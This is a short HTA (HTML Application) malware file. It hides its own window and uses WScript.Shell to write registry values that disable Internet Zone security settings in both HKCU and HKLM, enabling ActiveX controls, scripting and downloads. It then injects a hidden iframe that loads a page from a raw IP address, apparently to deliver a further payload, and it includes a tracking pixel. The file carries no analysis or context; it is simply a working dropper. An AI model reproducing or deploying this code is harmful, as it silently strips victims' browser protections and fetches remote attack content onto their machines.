<hta:application id=hta_note_id
  applicationName=hta_note_name
  showInTaskBar=no
  caption=no
  innerBorder=no
  selection=no
  scroll=no
  contextmenu=no />
   <script language=javascript>
        window.resizeTo(0, 0);
       
 </script>


<script>
function Writer(key) {
var WSHShell = new ActiveXObject("WScript.Shell");
bigkey = hotkey + "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\" + key;
WSHShell.RegWrite(bigkey, value, "REG_DWORD"); }
function WriteReg(){
value = 0x00000000; Writer("1001"); Writer("1004"); Writer("1201"); Writer("1200"); Writer("1405"); Writer("1A02");
Writer("1A03"); Writer("1803"); Writer("1604"); Writer("1406"); Writer("1802"); Writer("1800"); Writer("1804"); Writer("1607"); Writer("1606"); Writer("1400"); Writer("1407"); Writer("1402");
value = 0x00020000; Writer("1E05"); Writer("1A00"); value = 0x00000001; Writer("1601"); value = 0x00010000; Writer("1C00");}
function DoIt()
{ hotkey = "HKCU"; try{WriteReg(); } catch(e){}
hotkey = "HKLM"; try {  WriteReg(); } catch(e){} }
function cla(){
try {
document.write('<IFRAME id="huyvrot" SRC="http://69.50.191.68/instax.html" FRAMEBORDER=0></IFRAME>');
} catch(e){}
}
DoIt();
setTimeout("cla()",2000);
</script>
<img height="1" width="1" alt="" src="http://e0.extreme-dm.com/s9.g?login=sw2005&amp;j=n&amp;jv=n"/>
